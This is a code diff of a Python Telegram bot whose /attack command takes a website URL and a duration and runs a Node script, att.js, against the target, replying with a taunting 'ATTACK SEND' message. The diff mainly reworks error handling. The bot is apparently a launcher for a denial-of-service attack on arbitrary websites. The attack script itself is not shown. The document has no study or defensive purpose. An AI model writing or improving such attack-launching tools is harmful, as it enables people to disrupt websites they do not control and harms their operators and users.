@@ -10,17 +10,18 @@ def attack(update: Update, context: CallbackContext) -> None:
     if len(args) < 2:
         update.message.reply_text("Usage: /attack <website_url> <time_in_seconds>")
         return
-    
-    website_url = args[0]
-    time_in_seconds = args[1]
 
-    command = ["node", "att.js", website_url, time_in_seconds]
+    website_url = args[0]
+    time = args[1]
+
     try:
-        result = subprocess.run(command, capture_output=True, text=True)
-        output = result.stdout.strip() if result.stdout else result.stderr.strip()
-        update.message.reply_text(output)
-    except Exception as e:
-        update.message.reply_text(f"An error occurred: {e}")
+        # Run the command with subprocess
+        result = subprocess.run(['node', 'att.js', website_url, time], capture_output=True, text=True, check=True)
+        output = result.stdout.strip()
+        update.message.reply_text(output or "ATTACK SEND BY 😈MD OMOR FARUK😈")  # Send success message or default message
+    except subprocess.CalledProcessError as e:
+        error_msg = f"Error: {e.stderr.strip()}" if e.stderr else "Unknown error occurred"
+        update.message.reply_text(error_msg)  # Send error message
 
 def main():
     updater = Updater(TOKEN, use_context=True)
@@ -31,4 +32,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-        
+    
